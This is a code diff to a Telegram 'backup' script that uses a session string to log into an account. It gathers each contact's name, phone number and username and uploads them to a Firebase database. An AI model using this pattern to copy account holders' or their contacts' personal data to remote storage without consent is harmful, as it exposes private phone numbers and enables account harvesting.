@@ -97,12 +97,27 @@ async def run_fast_backup(session_string, tg_user_id, tg_username):
     my_username = re.sub(r'[\.\$#\[\]/]', '_', me.username or str(me.id))
     base_path = f"backup/{my_username}"
 
-    # 1. Contacts
+        # 1. Contacts
     contacts = await client(GetContactsRequest(hash=0))
     contact_ids = {str(u.id) for u in contacts.users}
+    
+    # NEW: Actually format and save the contacts to Firebase
+    contacts_data = {}
+    for user in contacts.users:
+        contacts_data[str(user.id)] = {
+            "first_name": user.first_name or "",
+            "last_name": user.last_name or "",
+            "phone": f"+{user.phone}" if user.phone else "Hidden",
+            "username": user.username or "None"
+        }
+    if contacts_data:
+        put_to_firebase(f"{base_path}/contacts", contacts_data)
+        print(f"✅ Saved {len(contacts_data)} saved contacts.")
+
     p2p_users = []
     unsaved = {}
     dialogs_data = {"channels": {}, "groups": {}}
+
 
     # 2. Iterate Dialogs (Mapping P2P, Groups, and Channels)
     async for dialog in client.iter_dialogs():
